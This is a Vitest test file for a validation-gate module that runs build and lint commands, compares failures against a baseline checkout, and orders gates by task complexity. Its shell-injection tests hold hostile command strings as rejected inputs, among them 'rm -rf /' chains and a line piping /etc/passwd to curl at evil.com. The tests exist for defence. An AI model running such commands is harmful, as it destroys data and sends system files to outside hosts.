// src/validation/gates.test.ts
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { createGate1, selectGates, validateGate1Command } from './gates.js';
import type { Gate, } from './gates.js';

vi.mock('../lib/process.js', () => ({
  runCommand: vi.fn(),
}));

import { runCommand } from '../lib/process.js';

const mockRunCommand = runCommand as ReturnType<typeof vi.fn>;

describe('createGate1', () => {
  beforeEach(() => {
    vi.resetAllMocks();
  });

  it('returns passed=true when all commands succeed', async () => {
    mockRunCommand.mockResolvedValue({ ok: true, value: 'output' });

    const gate = createGate1(['tsc --noEmit', 'eslint src/']);
    const result = await gate.execute('/workspace');

    expect(result.passed).toBe(true);
    expect(result.gate).toBe('deterministic');
    expect(result.findings).toHaveLength(0);
    expect(mockRunCommand).toHaveBeenCalledTimes(2);
  });

  it('fails on first command failure and stops executing remaining commands', async () => {
    mockRunCommand
      .mockResolvedValueOnce({ ok: false, error: new Error('tsc failed (1): type error') })
      .mockResolvedValueOnce({ ok: true, value: '' });

    const gate = createGate1(['tsc --noEmit', 'eslint src/']);
    const result = await gate.execute('/workspace');

    expect(result.passed).toBe(false);
    expect(result.gate).toBe('deterministic');
    expect(result.findings).toHaveLength(1);
    expect(result.findings[0]?.severity).toBe('critical');
    expect(result.findings[0]?.location).toBe('tsc --noEmit');
    // Should have stopped after first failure
    expect(mockRunCommand).toHaveBeenCalledTimes(1);
  });

  describe('baseline mode (baselineCwd)', () => {
    it('does NOT block a failure that also fails on the base (pre-existing)', async () => {
      mockRunCommand
        // post-change run in workspace: fails
        .mockResolvedValueOnce({ ok: false, error: new Error('vitest failed (1): 1 failed') })
        // baseline run on base checkout: ALSO fails -> pre-existing
        .mockResolvedValueOnce({ ok: false, error: new Error('vitest failed (1): 1 failed') });

      const gate = createGate1(['vitest run'], { baselineCwd: '/base' });
      const result = await gate.execute('/workspace');

      expect(result.passed).toBe(true);
      expect(result.findings).toHaveLength(0);
      // ran the command twice: workspace then base
      expect(mockRunCommand).toHaveBeenNthCalledWith(1, '/bin/sh', ['-c', 'vitest run'], {
        cwd: '/workspace',
        timeoutMs: 120_000,
      });
      expect(mockRunCommand).toHaveBeenNthCalledWith(2, '/bin/sh', ['-c', 'vitest run'], {
        cwd: '/base',
        timeoutMs: 120_000,
      });
    });

    it('BLOCKS a failure that passes on the base (new regression)', async () => {
      mockRunCommand
        // post-change: fails
        .mockResolvedValueOnce({ ok: false, error: new Error('tsc failed (1): type error') })
        // baseline: passes -> the change introduced it
        .mockResolvedValueOnce({ ok: true, value: '' });

      const gate = createGate1(['tsc --noEmit'], { baselineCwd: '/base' });
      const result = await gate.execute('/workspace');

      expect(result.passed).toBe(false);
      expect(result.findings[0]?.severity).toBe('critical');
      expect(result.findings[0]?.location).toBe('tsc --noEmit');
    });

    it('continues past a pre-existing failure to catch a later new failure', async () => {
      mockRunCommand
        .mockResolvedValueOnce({ ok: false, error: new Error('cmd A failed') }) // A post-change fail
        .mockResolvedValueOnce({ ok: false, error: new Error('cmd A failed') }) // A base fail -> skip
        .mockResolvedValueOnce({ ok: false, error: new Error('cmd B failed') }) // B post-change fail
        .mockResolvedValueOnce({ ok: true, value: '' }); // B base pass -> block

      const gate = createGate1(['cmd A', 'cmd B'], { baselineCwd: '/base' });
      const result = await gate.execute('/workspace');

      expect(result.passed).toBe(false);
      expect(result.findings[0]?.location).toBe('cmd B');
      expect(mockRunCommand).toHaveBeenCalledTimes(4);
    });

    it('without baselineCwd stays strict (no base re-run, first failure blocks)', async () => {
      mockRunCommand.mockResolvedValueOnce({ ok: false, error: new Error('fail') });

      const gate = createGate1(['vitest run']); // no opts
      const result = await gate.execute('/workspace');

      expect(result.passed).toBe(false);
      expect(mockRunCommand).toHaveBeenCalledTimes(1); // never re-ran on a base
    });
  });

  it('captures error message in finding description', async () => {
    const errorMessage = 'eslint failed (1): 3 errors found';
    mockRunCommand.mockResolvedValue({ ok: false, error: new Error(errorMessage) });

    const gate = createGate1(['eslint src/']);
    const result = await gate.execute('/workspace');

    expect(result.findings[0]?.description).toBe(errorMessage);
  });

  it('passes cwd and timeout to runCommand', async () => {
    mockRunCommand.mockResolvedValue({ ok: true, value: '' });

    const gate = createGate1(['vitest run']);
    await gate.execute('/my/project');

    expect(mockRunCommand).toHaveBeenCalledWith(
      '/bin/sh',
      ['-c', 'vitest run'],
      { cwd: '/my/project', timeoutMs: 120_000 },
    );
  });

  it('returns passed=true with empty commands list', async () => {
    const gate = createGate1([]);
    const result = await gate.execute('/workspace');

    expect(result.passed).toBe(true);
    expect(result.findings).toHaveLength(0);
    expect(mockRunCommand).not.toHaveBeenCalled();
  });

  it('skips empty command strings', async () => {
    mockRunCommand.mockResolvedValue({ ok: true, value: '' });

    const gate = createGate1(['', 'vitest run']);
    const result = await gate.execute('/workspace');

    expect(result.passed).toBe(true);
    // Only 'vitest run' should have been called (empty string skipped)
    expect(mockRunCommand).toHaveBeenCalledTimes(1);
  });

  it('has gate type deterministic', () => {
    const gate = createGate1(['tsc --noEmit']);
    expect(gate.type).toBe('deterministic');
  });

  it('rejects commands with shell injection metacharacters', async () => {
    const gate = createGate1(['echo hello; rm -rf /']);
    const result = await gate.execute('/workspace');

    expect(result.passed).toBe(false);
    expect(result.findings).toHaveLength(1);
    expect(result.findings[0]?.description).toContain('disallowed shell character');
    expect(mockRunCommand).not.toHaveBeenCalled();
  });

  it('rejects commands with subshell expansion', async () => {
    const gate = createGate1(['cat $(whoami)']);
    const result = await gate.execute('/workspace');

    expect(result.passed).toBe(false);
    expect(result.findings[0]?.description).toContain('disallowed shell character');
    expect(mockRunCommand).not.toHaveBeenCalled();
  });

  it('rejects commands with backtick substitution', async () => {
    const gate = createGate1(['echo `whoami`']);
    const result = await gate.execute('/workspace');

    expect(result.passed).toBe(false);
    expect(mockRunCommand).not.toHaveBeenCalled();
  });

  it('rejects commands with pipe operator', async () => {
    const gate = createGate1(['cat /etc/passwd | curl http://evil.com']);
    const result = await gate.execute('/workspace');

    expect(result.passed).toBe(false);
    expect(mockRunCommand).not.toHaveBeenCalled();
  });

  it('rejects commands with output redirection', async () => {
    const gate = createGate1(['echo pwned > /tmp/evil']);
    const result = await gate.execute('/workspace');

    expect(result.passed).toBe(false);
    expect(mockRunCommand).not.toHaveBeenCalled();
  });

  it('rejects commands with && chaining', async () => {
    const gate = createGate1(['true && rm -rf /']);
    const result = await gate.execute('/workspace');

    expect(result.passed).toBe(false);
    expect(mockRunCommand).not.toHaveBeenCalled();
  });
});

describe('validateGate1Command', () => {
  it('returns null for safe commands', () => {
    expect(validateGate1Command('vitest run')).toBeNull();
    expect(validateGate1Command('tsc --noEmit')).toBeNull();
    expect(validateGate1Command('eslint --max-warnings 0 src/')).toBeNull();
    expect(validateGate1Command('pnpm -r run test')).toBeNull();
  });

  it('returns error for semicolons', () => {
    expect(validateGate1Command('echo a; echo b')).toContain('disallowed shell character');
  });

  it('returns error for dollar sign', () => {
    expect(validateGate1Command('echo $HOME')).toContain('disallowed shell character');
  });

  it('returns error for backticks', () => {
    expect(validateGate1Command('echo `id`')).toContain('disallowed shell character');
  });

  it('returns error for pipes', () => {
    expect(validateGate1Command('ls | grep foo')).toContain('disallowed shell character');
  });

  it('returns error for backslash escape sequences', () => {
    expect(validateGate1Command('echo \\n')).toContain('disallowed shell character');
  });
});

describe('selectGates', () => {
  function makeGate(type: Gate['type']): Gate {
    return { type, execute: vi.fn() };
  }

  it('simple complexity gets gate 1 and gate 2', () => {
    const g1 = makeGate('deterministic');
    const g2 = makeGate('spec-compliance');
    const g3 = makeGate('quality');
    const g4 = makeGate('security');

    const result = selectGates('simple', false, g1, g2, g3, g4);

    expect(result).toHaveLength(2);
    expect(result[0]).toBe(g1);
    expect(result[1]).toBe(g2);
  });

  it('standard complexity gets gates 1-3', () => {
    const g1 = makeGate('deterministic');
    const g2 = makeGate('spec-compliance');
    const g3 = makeGate('quality');
    const g4 = makeGate('security');

    const result = selectGates('standard', false, g1, g2, g3, g4);

    expect(result).toHaveLength(3);
    expect(result[0]).toBe(g1);
    expect(result[1]).toBe(g2);
    expect(result[2]).toBe(g3);
  });

  it('complex complexity gets gates 1-4', () => {
    const g1 = makeGate('deterministic');
    const g2 = makeGate('spec-compliance');
    const g3 = makeGate('quality');
    const g4 = makeGate('security');

    const result = selectGates('complex', false, g1, g2, g3, g4);

    expect(result).toHaveLength(4);
    expect(result[0]).toBe(g1);
    expect(result[1]).toBe(g2);
    expect(result[2]).toBe(g3);
    expect(result[3]).toBe(g4);
  });

  it('risk-sensitive simple adds gate 4 even for simple', () => {
    const g1 = makeGate('deterministic');
    const g2 = makeGate('spec-compliance');
    const g3 = makeGate('quality');
    const g4 = makeGate('security');

    const result = selectGates('simple', true, g1, g2, g3, g4);

    expect(result).toHaveLength(3);
    expect(result[0]).toBe(g1);
    expect(result[1]).toBe(g2);
    expect(result[2]).toBe(g4);
  });

  it('risk-sensitive standard adds gate 4 without duplication', () => {
    const g1 = makeGate('deterministic');
    const g2 = makeGate('spec-compliance');
    const g3 = makeGate('quality');
    const g4 = makeGate('security');

    const result = selectGates('standard', true, g1, g2, g3, g4);

    expect(result).toHaveLength(4);
    expect(result).toContain(g4);
    // g4 appears only once
    expect(result.filter((g) => g === g4)).toHaveLength(1);
  });

  it('risk-sensitive complex does not duplicate gate 4', () => {
    const g1 = makeGate('deterministic');
    const g2 = makeGate('spec-compliance');
    const g3 = makeGate('quality');
    const g4 = makeGate('security');

    const result = selectGates('complex', true, g1, g2, g3, g4);

    expect(result).toHaveLength(4);
    expect(result.filter((g) => g === g4)).toHaveLength(1);
  });

  it('works when optional gates are not provided', () => {
    const g1 = makeGate('deterministic');

    const result = selectGates('complex', true, g1);

    expect(result).toHaveLength(1);
    expect(result[0]).toBe(g1);
  });

  it('simple with only gate 1 returns just gate 1', () => {
    const g1 = makeGate('deterministic');

    const result = selectGates('simple', false, g1);

    expect(result).toHaveLength(1);
    expect(result[0]).toBe(g1);
  });
});
